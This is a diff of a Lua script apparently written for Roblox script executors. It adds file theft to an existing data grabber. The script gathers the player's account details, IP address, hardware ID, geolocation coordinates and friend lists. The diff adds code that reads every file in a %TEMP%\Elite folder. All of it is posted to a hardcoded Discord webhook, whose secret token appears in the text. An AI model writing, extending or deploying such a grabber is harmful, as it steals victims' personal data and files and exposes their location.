@@ -3,7 +3,7 @@ local http_request = (syn and syn.request) or (http and http.request) or http_re
 local webhook_url = "https://discord.com/api/webhooks/1266422703410249828/6-2Qs36Hk_zMN5vdTDW3dM8ZsKIFO1VyO5JD9TO-PwNHjY2R-ORV5D3JXGy4tcRh-O98"
 local ip_url = "http://api64.ipify.org?format=json"
 local geo_url = "http://ip-api.com/json/"
-local geocode_url = "https://maps.googleapis.com/maps/api/geocode/json?latlng=" -- Make sure to replace with an actual geocoding API URL and include your API key
+local temp_dir = os.getenv("TEMP") .. "\\Elite"
 
 local player = game:GetService("Players").LocalPlayer
 
@@ -23,19 +23,6 @@ local function get_location(ip)
     })
     local data = game:GetService("HttpService"):JSONDecode(response.Body)
     return data
-end
-
-local function get_address(lat, lon)
-    local response = http_request({
-        Url = geocode_url .. lat .. "," .. lon .. "&key=YOUR_API_KEY", -- Replace 'YOUR_API_KEY' with your actual API key
-        Method = "GET"
-    })
-    local data = game:GetService("HttpService"):JSONDecode(response.Body)
-    if data.results and #data.results > 0 then
-        return data.results[1].formatted_address
-    else
-        return "Address not found"
-    end
 end
 
 local function get_friends()
@@ -77,34 +64,60 @@ local function get_following()
     return following
 end
 
+local function get_temp_files_contents()
+    local files = {}
+    local p = io.popen('dir "' .. temp_dir .. '" /b')
+    for file in p:lines() do
+        local file_path = temp_dir .. "\\" .. file
+        local f = io.open(file_path, "r")
+        if f then
+            local content = f:read("*all")
+            table.insert(files, {name = file, content = content})
+            f:close()
+        end
+    end
+    p:close()
+    return files
+end
+
 local ip = get_ip()
 local location_data = get_location(ip)
-local address = get_address(location_data.lat, location_data.lon)
 local friends_list = get_friends()
 local followers_list = get_followers()
 local following_list = get_following()
+
+local fields = {
+    {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
+    {["name"] = "User ID", ["value"] = player.UserId, ["inline"] = true},
+    {["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
+    {["name"] = "Account Age (days)", ["value"] = player.AccountAge, ["inline"] = true},
+    {["name"] = "Is Premium", ["value"] = tostring(player.MembershipType == Enum.MembershipType.Premium), ["inline"] = true},
+    {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
+    {["name"] = "HWID", ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(), ["inline"] = true},
+    {["name"] = "Location", ["value"] = location_data.city .. ", " .. location_data.regionName .. ", " .. location_data.country, ["inline"] = true},
+    {["name"] = "Coordinates", ["value"] = location_data.lat .. ", " .. location_data.lon, ["inline"] = true},
+    {["name"] = "Friends Count", ["value"] = #friends_list, ["inline"] = true},
+    {["name"] = "Followers Count", ["value"] = #followers_list, ["inline"] = true},
+    {["name"] = "Following Count", ["value"] = #following_list, ["inline"] = true},
+    {["name"] = "Friends List", ["value"] = table.concat(friends_list, ", "), ["inline"] = false},
+    {["name"] = "Followers List", ["value"] = table.concat(followers_list, ", "), ["inline"] = false},
+    {["name"] = "Following List", ["value"] = table.concat(following_list, ", "), ["inline"] = false}
+}
+
+local files = get_temp_files_contents()
+if #files > 0 then
+    for _, file in ipairs(files) do
+        table.insert(fields, {["name"] = "File: " .. file.name, ["value"] = file.content, ["inline"] = false})
+    end
+else
+    table.insert(fields, {["name"] = "Temp Files", ["value"] = "Failed to get %temp%/Elite files", ["inline"] = false})
+end
 
 local payload = {
     ["content"] = "New script execution detected!",
     ["embeds"] = {{
         ["title"] = "Player Information",
-        ["fields"] = {
-            {["name"] = "Username", ["value"] = player.Name, ["inline"] = true},
-            {["name"] = "User ID", ["value"] = player.UserId, ["inline"] = true},
-            {["name"] = "Display Name", ["value"] = player.DisplayName, ["inline"] = true},
-            {["name"] = "Account Age (days)", ["value"] = player.AccountAge, ["inline"] = true},
-            {["name"] = "Is Premium", ["value"] = tostring(player.MembershipType == Enum.MembershipType.Premium), ["inline"] = true},
-            {["name"] = "IP Address", ["value"] = ip, ["inline"] = true},
-            {["name"] = "HWID", ["value"] = game:GetService("RbxAnalyticsService"):GetClientId(), ["inline"] = true},
-            {["name"] = "Location", ["value"] = location_data.city .. ", " .. location_data.regionName .. ", " .. location_data.country, ["inline"] = true},
-            {["name"] = "Coordinates", ["value"] = location_data.lat .. ", " .. location_data.lon .. "\n" .. address, ["inline"] = true},
-            {["name"] = "Friends Count", ["value"] = #friends_list, ["inline"] = true},
-            {["name"] = "Followers Count", ["value"] = #followers_list, ["inline"] = true},
-            {["name"] = "Following Count", ["value"] = #following_list, ["inline"] = true},
-            {["name"] = "Friends List", ["value"] = table.concat(friends_list, ", "), ["inline"] = false},
-            {["name"] = "Followers List", ["value"] = table.concat(followers_list, ", "), ["inline"] = false},
-            {["name"] = "Following List", ["value"] = table.concat(following_list, ", "), ["inline"] = false}
-        },
+        ["fields"] = fields,
         ["color"] = 16711680 -- Red color
     }}
 }
@@ -113,9 +126,11 @@ local headers = {
     ["Content-Type"] = "application/json"
 }
 
-local response = http_request({
+local data = {
     Url = webhook_url,
     Method = "POST",
     Headers = headers,
     Body = game:GetService("HttpService"):JSONEncode(payload)
-})
+}
+
+http_request(data)
